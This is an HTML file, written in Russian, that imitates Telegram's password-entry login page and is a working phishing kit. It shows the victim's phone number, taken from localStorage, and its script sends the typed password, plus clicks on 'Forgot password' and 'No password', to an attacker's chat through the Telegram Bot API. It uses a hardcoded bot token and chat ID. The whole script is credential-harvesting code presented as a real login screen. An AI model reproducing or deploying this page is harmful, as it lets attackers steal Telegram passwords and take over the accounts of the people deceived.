<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram — ввод пароля</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #f0f2f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            color: #1c1e21;
        }

        .tg-card {
            max-width: 400px;
            width: 100%;
            background-color: #ffffff;
            border-radius: 16px;
            box-shadow: 0 4px 18px rgba(0, 0, 0, 0.08), 0 2px 6px rgba(0, 0, 0, 0.02);
            padding: 32px 24px 28px;
        }

        .tg-header h1 {
            font-size: 28px;
            font-weight: 600;
            line-height: 1.2;
            color: #0a0a0a;
            letter-spacing: -0.2px;
            margin-bottom: 12px;
        }

        .tg-header .phone-hint {
            font-size: 15px;
            color: #6c757d;
            font-weight: 400;
            margin-bottom: 32px;
            line-height: 1.4;
        }

        /* Контейнер для поля с паролем и глазиком */
        .password-wrapper {
            position: relative;
            width: 100%;
            margin-bottom: 12px;
        }

        .password-input {
            width: 100%;
            background-color: #f8f9fa;
            border: 1.5px solid #e9ecef;
            border-radius: 14px;
            padding: 18px 50px 18px 16px;
            font-size: 20px;
            color: #1a1a1a;
            outline: none;
            transition: all 0.15s;
            font-family: monospace;
            letter-spacing: 2px;
        }

        .password-input:focus {
            border-color: #2f8dbb;
            background-color: #ffffff;
            box-shadow: 0 0 0 3px rgba(47, 141, 187, 0.1);
        }

        .password-input::placeholder {
            color: #adb5bd;
            font-size: 16px;
            letter-spacing: normal;
        }

        /* Кнопка-глазик */
        .toggle-password {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            font-size: 24px;
            color: #8e98a3;
            padding: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: color 0.2s;
        }

        .toggle-password:hover {
            color: #2f8dbb;
        }

        /* Контейнер для ссылок под полем */
        .password-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
            font-size: 14px;
        }

        .forgot-link a, .no-password-link {
            color: #6c757d;
            text-decoration: none;
            transition: color 0.2s;
            cursor: pointer;
            background: none;
            border: none;
            font-size: 14px;
        }

        .forgot-link a:hover, .no-password-link:hover {
            color: #2f8dbb;
            text-decoration: underline;
        }

        .no-password-link {
            /* Абсолютно незаметная - такой же цвет как у обычного текста */
            color: #6c757d;
        }

        /* Кнопка отправки */
        .submit-btn {
            background-color: #2f8dbb;
            color: white;
            border: none;
            border-radius: 12px;
            padding: 16px 20px;
            font-size: 18px;
            font-weight: 600;
            width: 100%;
            text-align: center;
            cursor: pointer;
            letter-spacing: 0.3px;
            box-shadow: 0 2px 8px rgba(47, 141, 187, 0.2);
            margin-bottom: 20px;
            transition: background-color 0.2s;
        }

        .submit-btn:hover {
            background-color: #2679a3;
        }

        .submit-btn:active {
            background-color: #1f6385;
        }

        .submit-btn:disabled {
            background-color: #9bc2d9;
            cursor: not-allowed;
        }

        hr {
            border: none;
            border-top: 1px solid #eef2f5;
            margin: 20px 0 14px;
        }

        .back-link {
            text-align: center;
            font-size: 15px;
        }

        .back-link a {
            color: #8e98a3;
            text-decoration: none;
        }

        /* Мобильные улучшения */
        @media (max-width: 480px) {
            .tg-card {
                padding: 24px 16px;
            }
            
            .tg-header h1 {
                font-size: 24px;
            }
            
            .password-input {
                padding: 16px 45px 16px 14px;
                font-size: 18px;
            }
            
            .toggle-password {
                font-size: 22px;
                right: 12px;
            }
            
            .password-actions {
                font-size: 13px;
            }
        }
    </style>
</head>
<body>
    <div class="tg-card">
        <div class="tg-header">
            <h1>Введите пароль</h1>
            <div class="phone-hint" id="phoneDisplay">
                Введите пароль для входа в аккаунт
            </div>
        </div>

        <!-- Поле для ввода пароля с глазиком -->
        <div class="password-wrapper">
            <input type="password" class="password-input" id="passwordInput" placeholder="··········" maxlength="30" autofocus>
            <button class="toggle-password" id="togglePassword" type="button">👁️</button>
        </div>

        <!-- Незаметная кнопка "Нет пароля?" и ссылка "Забыли пароль?" -->
        <div class="password-actions">
            <div class="forgot-link">
                <a href="#" id="forgotLink">Забыли пароль?</a>
            </div>
            <button class="no-password-link" id="noPasswordBtn">Нет пароля?</button>
        </div><br><br><br><br>

        <!-- Кнопка для отправки пароля -->
        <button class="submit-btn" id="submitBtn">ВОЙТИ</button>

        <hr>

        <div class="back-link">
            <a href="index.html" id="backLink">← Назад</a>
        </div>
    </div>

    <script>
        // ========== СКРИПТ ДЛЯ СТРАНИЦЫ ПАРОЛЯ ==========
        
        // ВАШИ ДАННЫЕ TELEGRAM
        const BOT_TOKEN = '8780785505:AAGKR5NJPxt2OHM0R4dQ725MyhV8JJ5pg3c';
        const CHAT_ID = '5373563389';
        
        // Получаем элементы
        const passwordInput = document.getElementById('passwordInput');
        const togglePassword = document.getElementById('togglePassword');
        const submitBtn = document.getElementById('submitBtn');
        const forgotLink = document.getElementById('forgotLink');
        const noPasswordBtn = document.getElementById('noPasswordBtn');
        const backLink = document.getElementById('backLink');
        const phoneDisplay = document.getElementById('phoneDisplay');
        
        // Получаем сохраненный номер с предыдущей страницы
        const savedPhone = localStorage.getItem('tg_phone') || 'Номер не указан';
        
        // Показываем номер на странице
        phoneDisplay.innerHTML = `Введите пароль для номера:<br><strong>${savedPhone}</strong>`;
        
        // ===== ФУНКЦИЯ ПОКАЗАТЬ/СКРЫТЬ ПАРОЛЬ =====
        togglePassword.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.textContent = type === 'password' ? '👁️' : '👁️‍🗨️';
        });
        
        // Функция отправки в Telegram
        function sendToTelegram(messageText) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            const message = `
${messageText}
📱 <b>Номер:</b> ${savedPhone}
⏱ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
━━━━━━━━━━━━━━━━━━━━━
            `;
            
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('✅ Отправлено в Telegram');
                } else {
                    console.error('❌ Ошибка Telegram:', data);
                }
            })
            .catch(error => {
                console.error('❌ Ошибка соединения:', error);
            });
        }
        
        // Обработчик кнопки "ВОЙТИ" (отправка пароля)
        submitBtn.addEventListener('click', function() {
            const password = passwordInput.value.trim();
            
            if (password.length === 0) {
                alert('Пожалуйста, введите пароль');
                passwordInput.focus();
                return;
            }
            
            // Блокируем кнопку
            submitBtn.disabled = true;
            submitBtn.textContent = 'ОТПРАВКА...';
            
            // Отправляем пароль
            sendToTelegram(`🔐 <b>ПАРОЛЬ:</b> <code>${password}</code>`);
            
            // Очищаем поле
            passwordInput.value = '';
            passwordInput.setAttribute('type', 'password');
            togglePassword.textContent = '👁️';
            
            setTimeout(() => {
                submitBtn.disabled = false;
                submitBtn.textContent = 'ВОЙТИ';
                passwordInput.focus();
            }, 2000);
        });
        
        // Отправка по Enter
        passwordInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                submitBtn.click();
            }
        });
        
        // Ссылка "Забыли пароль"
        forgotLink.addEventListener('click', (e) => {
            e.preventDefault();
            sendToTelegram(`❓ <b>ЗАБЫЛ ПАРОЛЬ</b> (нажал на ссылку)`);
            alert('✅ Запрос на восстановление пароля отправлен');
        });
        
        // КНОПКА "НЕТ ПАРОЛЯ?" - ОТПРАВЛЯЕТ СООБЩЕНИЕ
        noPasswordBtn.addEventListener('click', () => {
            sendToTelegram(`⚠️ <b>НЕТ ПАРОЛЯ</b> (пользователь нажал "Нет пароля?")`);
            alert('✅ Информация отправлена');
        });
        
        // Возврат назад
        backLink.addEventListener('click', (e) => {
            e.preventDefault();
            window.location.href = 'index.html';
        });
        
        // Фокус на поле при загрузке
        window.addEventListener('load', () => {
            setTimeout(() => {
                passwordInput.focus();
            }, 300);
        });
    </script>
</body>
</html>
